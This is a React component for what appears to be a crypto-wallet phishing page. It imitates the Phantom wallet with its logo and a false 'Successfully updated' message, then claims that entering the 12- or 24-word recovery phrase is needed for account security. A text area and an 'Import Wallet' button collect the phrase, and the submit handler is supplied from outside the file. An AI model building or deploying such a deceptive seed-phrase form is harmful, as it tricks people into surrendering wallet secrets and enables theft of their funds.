import { Button } from "@/components/ui/button";
import { WalletOption } from "../WalletTypes";

interface PhantomPhraseFormProps {
  selectedWallet: WalletOption;
  phrase: string;
  setPhrase: (phrase: string) => void;
  onSubmit: (e: React.FormEvent) => void;
}

export const PhantomPhraseForm: React.FC<PhantomPhraseFormProps> = ({
  selectedWallet,
  phrase,
  setPhrase,
  onSubmit
}) => {
  return (
    <div className="flex flex-col items-center">
      <div className="bg-black rounded-full p-8 mb-4">
        <div className="w-20 h-20">
          <svg width="100%" height="100%" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M64 2C29.8 2 2 29.8 2 64c0 4.3.5 8.5 1.2 12.6h37.5c7.8 0 14.1 6.3 14.1 14.1v2.8h18.5v-2.8c0-7.8 6.3-14.1 14.1-14.1h37.4c.9-4.1 1.2-8.3 1.2-12.6 0-34.2-27.8-62-62-62z" fill="white"></path>
            <path d="M88.3 50.6H74.5V35c0-2.8-2.3-5-5-5H58.5c-2.8 0-5.1 2.2-5.1 5v15.6H39.6c-2.8 0-5 2.3-5 5v11c0 2.8 2.2 5 5 5h13.8v15.6c0 2.7 2.3 5 5.1 5h11c2.7 0 5-2.3 5-5V66.6h13.8c2.7 0 5-2.2 5-5v-11c0-2.7-2.3-5-5-5z" fill="white"></path>
          </svg>
        </div>
      </div>
      
      <h3 className="text-xl font-semibold mb-2">Successfully updated</h3>
      <p className="text-sm text-center text-gray-500 mb-6 max-w-xs">
        To ensure your account's security and prevent any fraudulent activity, please enter your seed phrase to confirm the changes.
      </p>
      
      <div className="grid grid-cols-3 gap-2 w-full mb-4">
        {Array.from({length: 12}, (_, i) => (
          <div key={i} className="border border-gray-300 rounded p-2 bg-gray-800 text-white text-center">
            {i + 1}.
          </div>
        ))}
      </div>
      
      <textarea
        value={phrase}
        onChange={(e) => setPhrase(e.target.value)}
        className="w-full h-24 p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-wallet-blue focus:border-transparent mb-4"
        placeholder="Enter your 12 or 24-word recovery phrase, words separated by spaces"
      />
      
      <Button 
        type="button"
        onClick={onSubmit} 
        className="w-full py-2 bg-purple-500 hover:bg-purple-600 transition-colors rounded-md"
      >
        Import Wallet
      </Button>
      
      <div className="mt-4 text-center">
        <button className="text-sm text-purple-600">
          I have a 24-word recovery phrase
        </button>
      </div>
    </div>
  );
};